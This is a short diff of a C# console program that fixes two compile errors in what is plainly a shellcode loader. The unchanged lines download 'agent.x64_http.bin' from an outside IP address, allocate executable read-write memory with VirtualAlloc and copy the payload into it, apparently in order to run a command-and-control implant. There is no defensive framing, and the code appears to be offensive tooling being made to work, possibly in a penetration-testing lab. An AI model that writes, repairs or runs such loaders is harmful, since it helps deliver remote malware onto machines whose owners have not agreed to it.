@@ -67,13 +67,13 @@ namespace ConsoleApp1
         [DllImport("kernel32.dll")]
         static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 
-        public static void main()
+        public static void Main()
         {
             byte[] buf = new WebClient().DownloadData("http://192.168.45.217:8000/agent.x64_http.bin");
 
             int size = buf.Length;
 
-            IntPtr addr = VirtualAlloc(IntPtr.Zero, uint(size), 0x3000, 0x40);
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);
 
             Marshal.Copy(buf, 0, addr, size);
 
